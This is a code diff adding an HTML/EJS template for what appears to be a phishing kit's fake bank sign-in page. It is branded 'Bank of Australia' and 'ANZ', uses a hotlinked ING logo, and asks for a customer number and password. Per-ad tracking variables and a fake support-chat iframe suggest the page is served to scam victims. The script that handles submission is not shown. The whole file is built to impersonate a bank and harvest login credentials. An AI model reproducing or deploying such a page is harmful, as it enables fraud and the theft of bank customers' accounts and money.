@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of Australia | Global network of banks</title>
+
+    <style>
+        body {
+            display: block;
+            background: url("https://phonoteka.org/uploads/posts/2021-05/1621724509_10-phonoteka_org-p-fon-dlya-avtorizatsii-na-saite-12.jpg") no-repeat center top fixed;
+            background-size: cover;
+        }
+
+        .block {
+            text-align: center;
+        }
+
+        .form-block {
+            display: block;
+            width: 100%;
+            margin-bottom: 1rem;
+        }
+
+        .button {
+            margin-top: 2rem;
+            display: block;
+            width: 110%;
+            font-size: 19px;
+            color: #fff;
+            font-weight: 600;
+            padding: 1rem 2rem;
+            background: #0095ff;
+            outline: none;
+            border: none;
+            cursor: pointer;
+            border-radius: 0.5rem;
+            box-shadow: 0 0 20px 0 #0095ff;
+        }
+
+        .button[disabled] {
+            opacity: 0.75;
+            cursor: not-allowed;
+        }
+
+        #lk_form {
+            display: block;
+            margin: auto;
+            width: 50%;
+            text-align: left;
+            margin-top: 1rem;
+            padding: 1rem 2rem;
+        }
+
+        label {
+            font-size: 19px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #838383;
+            border-radius: 0.3rem;
+            outline: none;
+            transition: 0.5s all;
+        }
+
+        .input:focus,
+        .input:active,
+        .input:hover {
+            border-color: #ff6200;
+        }
+
+        .title {
+            font-size: 24px;
+        }
+
+        .ing-block {
+            display: block;
+            background: #fff;
+            width: 520px;
+            height: 583px;
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 2rem;
+            border-radius: 0.25rem;
+        }
+
+        .logo {
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            width: 128px;
+            padding-top: 1.5rem;
+        }
+
+        label,
+        .input,
+        p {
+            display: block;
+            margin: 0.5rem 0;
+        }
+
+        @media (max-width: 519px) {
+            .ing-block {
+                width: 100%;
+                height: 100%;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="/css/default_lk.css">
+</head>
+
+<body>
+    <div class="ing-block">
+        <div class="logo"><img src="https://login.ingbank.pl/mojeing/app/ca9b712972793332eb3d792c82f60b66.svg" alt="">
+        </div>
+        <div class="block">
+            <p class="title">Sign in to online banking ANZ</p>
+            <form id="lk_form">
+                <div class="form-block">
+                    <label for="">Customer Registration Number</label>
+                    <input type="text" id="custom_number" class="input" required>
+                </div>
+                <div class="form-block">
+                    <label for="">Password</label>
+                    <input type="password" id="password" class="input" required>
+                </div>
+                <div class="form-block">
+                    <button class="button" type="submit">Continue</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+<link rel="stylesheet" href="/css/support_parent.css" />
+<script>
+    const LOG_TOKEN = <%=log.token%>,
+        AD_LANG = "<%=log.ad.service.lang%>",
+        AD_ID = <%=log.ad.id%>,
+        translate = <%-JSON.stringify(translate) %>;
+</script>
+<script src="/js/lk.js" defer></script>
+<div class="
+chatra--webkit
+chatra--style-round
+chatra--side-bottom
+chatra--pos-right
+chatra--visible
+chatra--expanded
+chatra--fast-toggle
+" id="chatra" data-turbolinks-permanent="" style="
+width: 380px;
+height: 600px;
+transform: none;
+z-index: 2147483647;
+display: none;
+">
+    <div id="chatra__iframe-wrapper">
+        <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+            src="/supportChatFrame/<%=log.ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+    </div>
+</div>
+<div class="support-circle"
+    onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+
+</html>
